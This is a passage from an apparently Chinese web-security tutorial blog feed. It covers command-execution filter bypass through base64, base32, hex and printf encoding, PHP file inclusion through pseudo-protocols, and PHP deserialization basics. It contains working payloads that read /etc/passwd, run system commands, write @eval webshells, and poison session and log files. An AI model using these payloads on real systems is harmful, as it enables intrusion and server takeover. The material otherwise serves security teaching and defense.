<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">b&#x27;payload&#x27;</span></span><br><span class="line">e64 = base64.b64encode(s)</span><br><span class="line"><span class="built_in">print</span>(e64)</span><br><span class="line"></span><br><span class="line"><span class="comment">#参数S的类型必须是字节包(bytes)</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>绕过过程</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload编码 ---&gt; 目标服务器 ---&gt; 执行命令</span><br><span class="line">          绕过过滤      解码读取命令</span><br></pre></td></tr></table></figure></div>

<ul>
<li>payload</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat flag.php ---&gt; Y2F0IGZsYWcucGhw</span></span><br><span class="line"><span class="comment"># base -d ---&gt; base64解码</span></span><br><span class="line"><span class="comment"># /bin/bash ---&gt; 执行命令</span></span><br><span class="line"></span><br><span class="line">?cmd=system(<span class="string">&#x27;echo &quot;Y2F0IGZsYWcucGhw&quot;|base64 -d|/bin/bash&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>base32编码绕过</strong></p>
<ul>
<li><p>与<code>base64编码</code>绕过类似</p>
</li>
<li><p>python编码</p>
</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">b&#x27;payload&#x27;</span></span><br><span class="line">e32 = base64.b32encode(s)</span><br><span class="line"><span class="built_in">print</span>(e32)</span><br><span class="line"></span><br><span class="line"><span class="comment">#参数S的类型必须是字节包(bytes)</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>payload</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat flag.php ---&gt; MNQXIIDGNRQWOLTQNBYA====</span></span><br><span class="line"><span class="comment"># base -d ---&gt; base64解码</span></span><br><span class="line"><span class="comment"># /bin/bash ---&gt; 执行命令</span></span><br><span class="line"></span><br><span class="line">?cmd=system(<span class="string">&#x27;echo &quot;MNQXIIDGNRQWOLTQNBYA====&quot;|base32 -d|/bin/bash&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>HEX编码</strong></p>
<ul>
<li><p>16进制</p>
</li>
<li><p>python编码</p>
</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">s = <span class="string">b&#x27;payload&#x27;</span></span><br><span class="line">h = binascii.b2a_hex(s)</span><br><span class="line"><span class="built_in">print</span>(h)</span><br><span class="line"></span><br><span class="line"><span class="comment">#参数s的类型必须是字节包(bytes)</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>payload</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cat flag.php ---&gt; 63617420666c61672e706870</span><br><span class="line"># xxd ---&gt; 二进制显示和处理文件工具</span><br><span class="line"># -r -p ---&gt; 将纯十六进制转储的输出打印为ASCII格式</span><br><span class="line"># /bin/bash ---&gt; 执行命令</span><br><span class="line"></span><br><span class="line">?cmd=system(&#x27;echo &quot;63617420666c61672e706870&quot;|xxd -r -p|/bin/bash&#x27;);</span><br></pre></td></tr></table></figure></div>

<p><strong>shellcode</strong></p>
<ul>
<li>16进制机器码，本质上是一段汇编指令</li>
<li>payload</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat flag.php ---&gt; \x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70</span></span><br><span class="line"><span class="comment"># printf &quot;\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot; ---&gt; 输出为cat flag.php</span></span><br><span class="line"></span><br><span class="line">?cmd=system(<span class="string">&#x27;printf &quot;\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;|/bin/bash&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2023/08/20/Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="0x00-什么是文件包含漏洞"><a href="#0x00-什么是文件包含漏洞" class="headerlink" title="0x00 什么是文件包含漏洞"></a>0x00 什么是文件包含漏洞</h1><p>为了更好地使用代码的重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件。</p>
<h1 id="0x01-文件包含漏洞原理"><a href="#0x01-文件包含漏洞原理" class="headerlink" title="0x01 文件包含漏洞原理"></a>0x01 文件包含漏洞原理</h1><p>文件包含函数加载的参数没有经过过滤或者严格定义，可以被用户控制，包含了其他恶意文件，导致执行了非预期的代码</p>
<h1 id="0x02-文件包含漏洞危害"><a href="#0x02-文件包含漏洞危害" class="headerlink" title="0x02 文件包含漏洞危害"></a>0x02 文件包含漏洞危害</h1><ul>
<li>配合文件上传漏洞<strong>GetShell</strong></li>
<li>可以执行任意脚本代码 </li>
<li>网站源码文件以及配置文件泄露 </li>
<li>远程包含<strong>GetShell</strong></li>
<li>控制整个网站甚至是服务器</li>
</ul>
<h1 id="0x03-相关函数"><a href="#0x03-相关函数" class="headerlink" title="0x03 相关函数"></a>0x03 相关函数</h1><ul>
<li><strong>include()</strong></li>
</ul>
<p>如果出错的话，只会提出警告，会继续执行后续语句。</p>
<ul>
<li><strong>include_once()</strong></li>
</ul>
<p>和include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</p>
<ul>
<li><strong>require()</strong></li>
</ul>
<p> 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。</p>
<ul>
<li><strong>require_once()</strong></li>
</ul>
<p>和require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</p>
<h1 id="0x04-php伪协议"><a href="#0x04-php伪协议" class="headerlink" title="0x04 php伪协议"></a>0x04 php伪协议</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line"></span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line"></span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line"></span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span><br><span class="line"></span><br><span class="line">zlib:// — 压缩流</span><br><span class="line"></span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line"></span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line"></span><br><span class="line">phar:// — PHP 归档</span><br><span class="line"></span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line"></span><br><span class="line">rar:// — RAR</span><br><span class="line"></span><br><span class="line">ogg:// — 音频流</span><br><span class="line"></span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure></div>

<h1 id="0x05-文件包含漏洞利用"><a href="#0x05-文件包含漏洞利用" class="headerlink" title="0x05 文件包含漏洞利用"></a>0x05 文件包含漏洞利用</h1><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><ul>
<li><p><strong>LFI(Local File Inclusion)漏洞</strong>，本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。</p>
</li>
<li><p>这个漏洞不受<code>allow_url_fopen = On</code>和<code>allow_url_include = On</code>这两个的影响。</p>
</li>
</ul>
<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><ul>
<li><strong>RFI(Remote File Inclusion)漏洞</strong>，远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。</li>
</ul>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><ul>
<li><strong>allow_url_fopen&#x3D;On</strong>(默认为On) 规定是否允许从远程服务器或者网站检索数据（允许url里的封装协议访问文件） </li>
<li><strong>allow_url_include&#x3D;On</strong>(php5.2之后默认为Off，为off时不允许url里的封装协议包含文件）</li>
</ul>
<h3 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><ul>
<li><code>file://</code>伪协议用于访问本地文件系统</li>
<li>利用条件</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_include = On/Off</span><br><span class="line">allow_url_fopen = On/Off</span><br></pre></td></tr></table></figure></div>

<ul>
<li>payload</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=file://etc/passwd</span><br></pre></td></tr></table></figure></div>

<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a><strong>php:&#x2F;&#x2F;input</strong></h3><ul>
<li>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。</li>
</ul>
<p>注：当<code>enctype=&quot;multipart/form-data&quot;</code> 的时候 <code>php://input</code> 是无效的。</p>
<ul>
<li>利用条件</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_include = On</span><br><span class="line">allow_url_fopen = On/Off</span><br></pre></td></tr></table></figure></div>

<ul>
<li>payload</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">读取源码：</span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line"></span><br><span class="line">执行任意代码：</span><br><span class="line">?file=php://input</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">&lt;?php system(&#x27;whoami&#x27;); ?&gt;</span><br><span class="line"></span><br><span class="line">写入木马：</span><br><span class="line">?file=php://input</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">&lt;?php fputs(fopen(&#x27;hack.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[v])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a><strong>php:&#x2F;&#x2F;filter</strong></h3><ul>
<li>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。</li>
<li>利用条件</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_include = On/Off</span><br><span class="line">allow_url_fopen = On/Off</span><br></pre></td></tr></table></figure></div>

<ul>
<li>payload</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line"></span><br><span class="line">?file=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></div>

<ul>
<li>index.php</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a><strong>phar:&#x2F;&#x2F;</strong></h3><ul>
<li><p>php解压缩包的一个伪协议，不管后缀是什么，都会当做压缩包来解压。</p>
</li>
<li><p>利用条件</p>
</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php &gt;= 5.3.0</span><br><span class="line">allow_url_include = On/Off</span><br><span class="line">allow_url_fopen = On/Off</span><br></pre></td></tr></table></figure></div>

<ul>
<li>构造<code>test.zip</code></li>
</ul>
<p>将phpinfo.php打包成test.zip</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="title function_ invoke__">phpinfo</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>payload</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=phar://path/test.zip/phpinfo.php</span><br></pre></td></tr></table></figure></div>

<ul>
<li>命令执行payload</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">将phpinfo.php的内容改为 &lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=phar://path/test.zip/phpinfo.php</span><br></pre></td></tr></table></figure></div>

<ul>
<li>写入木马payload</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">将phpinfo.php的内容改为 &lt;?php @eval($_POST[123]);?&gt;</span><br><span class="line"></span><br><span class="line">?file=phar://path/test.zip/phpinfo.php</span><br></pre></td></tr></table></figure></div>

<h3 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a><strong>zip:&#x2F;&#x2F;</strong></h3><ul>
<li><p><code>zip</code>伪协议和<code>phar</code>伪协议类似</p>
</li>
<li><p>利用条件</p>
</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php &gt;= 5.3.0</span><br><span class="line">allow_url_include = On/Off</span><br><span class="line">allow_url_fopen = On/Off</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>构造<code>test.zip</code>包（与phar:&#x2F;&#x2F;类似）</p>
</li>
<li><p>payload</p>
</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用zip伪协议，需要指定绝对路径，而且压缩包文件和压缩包内的文件之间得用#，还要将#给URL编码为%23</span><br><span class="line"></span><br><span class="line">?file=zip://path/test.zip%23phpinfo.php</span><br></pre></td></tr></table></figure></div>

<ul>
<li>其余利用方法参考<strong>phar:&#x2F;&#x2F;</strong></li>
</ul>
<h3 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a><strong>data:&#x2F;&#x2F;</strong></h3><ul>
<li><p>数据流封装器，和<code>php://</code>相似，都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中</p>
</li>
<li><p>利用条件</p>
</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php &gt;= 5.2.0</span><br><span class="line">allow_url_include = On</span><br><span class="line">allow_url_fopen = On</span><br></pre></td></tr></table></figure></div>

<ul>
<li>payload</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">读取代码：</span><br><span class="line">?file=data:text/plain,[php代码]</span><br><span class="line">?file=data:text/plain;base64,[base编码的php代码]</span><br><span class="line"></span><br><span class="line">执行任意代码：</span><br><span class="line">?file=data:text/plain,&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</span><br><span class="line"></span><br><span class="line">写入木马：</span><br><span class="line">?file=data:text/plain,&lt;?php fputs(fopen(&#x27;hack.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[123])?&gt;&#x27;);?&gt;</span><br><span class="line">?file=data:text/plain;base64,PD9waHAgZnB1dHMoZm9wZW4oJ2hhY2sucGhwJywndycpLCc8P3BocCBAZXZhbCgkX1BPU1Rbdl0pPz4</span><br><span class="line">nKTs/Pg==</span><br></pre></td></tr></table></figure></div>

<h3 id="session包含"><a href="#session包含" class="headerlink" title="session包含"></a>session包含</h3><ul>
<li>利用条件</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">session文件路径已知，且其中内容部分可控。</span><br></pre></td></tr></table></figure></div>

<ul>
<li>案例</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$ctfs=$_GET[&#x27;ctfs&#x27;];</span><br><span class="line">$_SESSION[&quot;username&quot;]=$ctfs;</span><br><span class="line">?&gt;</span><br><span class="line">    </span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line">此php会将获取到的GET型ctfs变量的值存入到session中。</span><br><span class="line">当访问http://url/ctfs.php?ctfs= 后，</span><br><span class="line">会在/var/lib/php/session目录下存储session的值。</span><br><span class="line">可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></div>

<ul>
<li>payload</li>
</ul>
<p>注：php的session文件的保存路径可以在<strong>phpinfo</strong>的<strong>session.save_path</strong>看到。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctfs=%3C?php%20@eval($_POST[123])?%3E</span><br><span class="line"></span><br><span class="line">利用文件包含漏洞读取：</span><br><span class="line">?filename=/var/lib/php/session/sess_+sessionid</span><br></pre></td></tr></table></figure></div>

<h3 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h3><ul>
<li>利用条件</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要知道服务器日志的存储路径，且日志文件可读。</span><br></pre></td></tr></table></figure></div>

<ul>
<li>姿势</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</span><br></pre></td></tr></table></figure></div>

<h3 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h3><ul>
<li>利用条件</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">知道ssh-log位置，且可读。</span><br><span class="line">默认：</span><br><span class="line">/var/log/auth.log</span><br><span class="line">/var/log/secure</span><br></pre></td></tr></table></figure></div>

<ul>
<li>姿势</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">用ssh连接：</span><br><span class="line">ssh &#x27;&lt;?php phpinfo(); ?&gt;&#x27;@remotehost</span><br><span class="line">密码随便输</span><br><span class="line">然后在remotehost的ssh-log中就写入了这个php代码</span><br><span class="line">就可以包含日志文件了。</span><br></pre></td></tr></table></figure></div>

<h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><h1 id="0x06-防御"><a href="#0x06-防御" class="headerlink" title="0x06 防御"></a>0x06 防御</h1><p>配置<strong>open_basedir</strong>，限制访问在指定的区域。</p>
<p>做好文件的权限管理。</p>
<p>对危险字符进行过滤，比如过滤<code>.</code>（点）<code>/</code>（反斜杠）<code>\</code>（反斜杠）等特殊字符。</p>
<p>尽量将<strong>allow_url_include</strong>和<strong>allow_url_fopen</strong>配置为off。</p>
<h1 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h1><p><a class="link"   href="https://www.anquanke.com/post/id/248627#h2-0" >https://www.anquanke.com/post/id/248627#h2-0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/endust/p/11804170.html" >https://www.cnblogs.com/endust/p/11804170.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://m.freebuf.com/articles/web/336692.html" >https://m.freebuf.com/articles/web/336692.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/7176#toc-0" >https://xz.aliyun.com/t/7176#toc-0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化</title>
    <url>/2023/08/23/Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PHP/</url>
    <content><![CDATA[<h1 id="0x00-反序列化原理"><a href="#0x00-反序列化原理" class="headerlink" title="0x00 反序列化原理"></a>0x00 反序列化原理</h1><p>反序列化处的参数用户可控，服务器接收我们序列化后的字符串并且未经过滤把其中的变量放入一些魔术方法里面执行</p>
<h1 id="0x01-表达方式"><a href="#0x01-表达方式" class="headerlink" title="0x01 表达方式"></a>0x01 表达方式</h1><p>serialize序列化：所有格式第一位都是数据类型的英文字母简写</p>
<ul>
<li>空字符</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">null --- N;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>整型</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">666 --- i:666;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>浮点数</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">66.6 --- d:66.6;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>Boolean型</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">true --- b:1;</span><br><span class="line">false --- b:0;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>字符串</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;kkk&#x27; --- s:3(长度):&quot;kkk&quot;;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>数组</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(&#x27;kkk&#x27;);</span><br><span class="line">a(array):3(参数数量):&#123;i:0(编号);s:3:&quot;kkk&quot;;&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>对象</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">注：不能序列化类，可以序列化对象；只序列化成员变量，不序列化成员函数。</span><br><span class="line"></span><br><span class="line">O(object):4(类名长度):&quot;test&quot;(类名):1(变量数量):&#123;s:3(变量名字长度):&quot;pub&quot;(变量名字);s:3:&quot;kkk&quot;;&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>private私有属性序列化</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">注：在变量名前加“%00类名%00”.</span><br><span class="line"></span><br><span class="line">O:4:&quot;test&quot;:1:&#123;s:9(变量名字长度):&quot;testkkk&quot;(变量名字);&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>protected受保护属性序列化</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">注：在变量名前加“%00*%00”</span><br><span class="line">O:4:&quot;test&quot;:1:&#123;s:6(变量名字长度):&quot;*kkk&quot;(变量名字);&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="0x02-魔术方法"><a href="#0x02-魔术方法" class="headerlink" title="0x02 魔术方法"></a>0x02 魔术方法</h1><h2 id="什么是魔术方法？"><a href="#什么是魔术方法？" class="headerlink" title="什么是魔术方法？"></a>什么是魔术方法？</h2><p>一个预定义好的，在特定情况下自动触发的行为方法。</p>
<h2 id="魔术方法的作用"><a href="#魔术方法的作用" class="headerlink" title="魔术方法的作用"></a>魔术方法的作用</h2><p>在特定条件下自动调用相关方法，最终导致触发代码。</p>
<h1 id="0x03-构造和析构魔术方法"><a href="#0x03-构造和析构魔术方法" class="headerlink" title="0x03 构造和析构魔术方法"></a>0x03 构造和析构魔术方法</h1><h2 id="construct"><a href="#construct" class="headerlink" title="_construct()"></a>_construct()</h2><ul>
<li>构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发了构造函数1次&quot;</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;benben&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出结果:</span></span><br><span class="line"><span class="comment">触发了构造函数1次</span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">分析:</span></span><br><span class="line"><span class="comment">实例化对象时触发构造函数_construct()，序列化和反序列化不会触发。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="destruct"><a href="#destruct" class="headerlink" title="_destruct()"></a>_destruct()</h2><ul>
<li>析构函数，在对象的所有引用被删除或者当对象被显式销毁时执行的魔术方法。</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发了析构函数1次&quot;</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;benben&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">触发了析构函数1次</span></span><br><span class="line"><span class="comment">触发了析构函数1次</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">分析:</span></span><br><span class="line"><span class="comment">实例化对象结束后，代码运行完会销毁，触发析构函数_destruct();</span></span><br><span class="line"><span class="comment">当使用unserialize()函数时，会尝试重新创建原始对象。当使用完后会销毁，触发析构函数_destruct()。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

